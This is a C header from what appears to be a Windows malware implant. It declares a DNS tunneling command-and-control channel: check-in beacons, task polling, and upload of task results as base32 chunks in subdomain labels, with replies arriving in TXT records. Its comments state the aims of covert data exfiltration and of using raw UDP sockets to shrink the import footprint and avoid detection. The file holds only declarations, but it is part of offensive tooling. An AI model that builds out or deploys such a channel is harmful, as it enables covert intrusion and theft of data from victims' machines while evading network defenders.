#ifndef DN_DNS_H
#define DN_DNS_H

#include <windows.h>
#include "../util/types.h"

/*
 * DNS Tunneling Communication Channel
 *
 * Encodes C2 traffic inside DNS queries/responses:
 *   - Data exfil: base32-encoded chunks in subdomain labels
 *   - Data recv:  TXT record responses (base64-decoded)
 *   - Query format: <seq>.<chunk>.<session_id>.<domain>
 *
 * Supports A, AAAA, TXT, and CNAME record types.
 * Raw UDP socket to bypass windns.h (reduces import footprint).
 */

// DNS record types used for tunneling
#define DN_DNS_TYPE_A       1
#define DN_DNS_TYPE_CNAME   5
#define DN_DNS_TYPE_TXT     16
#define DN_DNS_TYPE_AAAA    28

// Protocol limits
#define DN_DNS_MAX_LABEL    63      // RFC 1035: max label length
#define DN_DNS_MAX_NAME     253     // RFC 1035: max domain name
#define DN_DNS_MAX_UDP      512     // standard DNS UDP payload
#define DN_DNS_MAX_EDNS     4096    // EDNS0 extended payload
#define DN_DNS_CHUNK_DATA   110     // max base32 data per query (fits in 2 labels)
#define DN_DNS_HDR_SIZE     12      // DNS header size

// Query prefixes (first label indicates message type)
#define DN_DNS_PREFIX_CHECKIN   'c'  // check-in beacon
#define DN_DNS_PREFIX_DATA      'd'  // data upload (results)
#define DN_DNS_PREFIX_POLL      'p'  // poll for tasks

// Initialize DNS comms (resolve nameserver, create socket)
BOOL dn_dns_init(void);

// Send check-in beacon via DNS, receive tasks
BOOL dn_dns_checkin(DN_METADATA* meta, DN_CHECKIN_RESPONSE* response);

// Send task results via DNS tunneling
BOOL dn_dns_send_results(DN_TASK_RESULT* results, int count);

// Cleanup DNS resources
void dn_dns_cleanup(void);

// ---- Internal encoder/decoder (exposed for testing) ----

// Base32 encode (RFC 4648 without padding, lowercase for DNS)
int dn_base32_encode(const BYTE* src, int src_len, char* dst, int dst_size);

// Base32 decode
int dn_base32_decode(const char* src, int src_len, BYTE* dst, int dst_size);

// Base64 decode (for TXT record responses)
int dn_base64_decode(const char* src, int src_len, BYTE* dst, int dst_size);

#endif // DN_DNS_H
